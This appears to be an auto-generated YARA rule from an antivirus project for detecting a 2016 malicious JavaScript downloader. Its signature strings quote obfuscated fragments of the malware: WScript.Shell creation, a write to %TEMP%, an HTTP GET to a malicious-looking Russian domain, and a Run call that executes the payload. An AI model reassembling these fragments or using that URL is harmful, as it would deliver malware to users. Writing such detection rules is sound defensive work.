rule sig_20160427_0844e6d5caf88709099b543cb9793fe9 {
  meta:
    description = "datamaliciousorder - file 20160427_0844e6d5caf88709099b543cb9793fe9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a60d0628d086aa915a8a4104fa59bbf6dff04f591d21b801c4cd468ae00d3839"

  strings:
    $s1  = "function GqjrmYkpog() {return RtnquYpjmw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"P1RMdF9" ascii
    $s2  = "function GqjrmYkpog() {return RtnquYpjmw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"P1RMdF9" ascii
    $s3  = "var RtnquYpjmw = function SfsssNfild() {return AxegrYfukh[ErqzqHgwbm](\"WScript\"+\".Shell\");}(), TpecyWacyl = 11;" fullword ascii
    $s4  = "function YmwzjHbvks(HajdeUnjka, BqilsOuzxg){AsgkjRwbcz = AsgkjRwbcz * 1; return HajdeUnjka - BqilsOuzxg;};" fullword ascii
    $s5  = "PzbobOmajt[IjejzMaxid](\"G\" + \"ET\", \"http://games-k.ru/n8eis\", false);" fullword ascii
    $s6  = "var AxegrYfukh = this[\"WScript\"];" fullword ascii
    $s7  = "function VykgvNseaf(){return CwvgnCunna + \"\";};" fullword ascii
    $s8  = "if (PzbobOmajt[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function VnyewWpmrl() {return ((ZpnrhPqrbo == true) && (ZpnrhPqrbo == EsmnoYxmtr)) ? 1 : AsgkjRwbcz;};" fullword ascii
    $s10 = "return YmwzjHbvks(VuxwpEjodw, YyrwaCjhbj);" fullword ascii
    $s11 = "QntxoNkeet = true;" fullword ascii
    $s12 = "function NgeynUsaqx(){return 23;};" fullword ascii
    $s13 = "var ZpnrhPqrbo = false;" fullword ascii
    $s14 = "function EairzDefok(EzfezCnrsz){RtnquYpjmw[\"R\"+\"un\"](EzfezCnrsz, AsgkjRwbcz, AsgkjRwbcz);};" fullword ascii
    $s15 = "ZpnrhPqrbo = true; " fullword ascii
    $s16 = "EsmnoYxmtr = true; " fullword ascii
    $s17 = "function DakdcGxzhz(){return ErqzqHgwbm;};" fullword ascii
    $s18 = "function MustzZacdb()" fullword ascii
    $s19 = "var QntxoNkeet = false;" fullword ascii
    $s20 = "var ZgeyrAxena = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}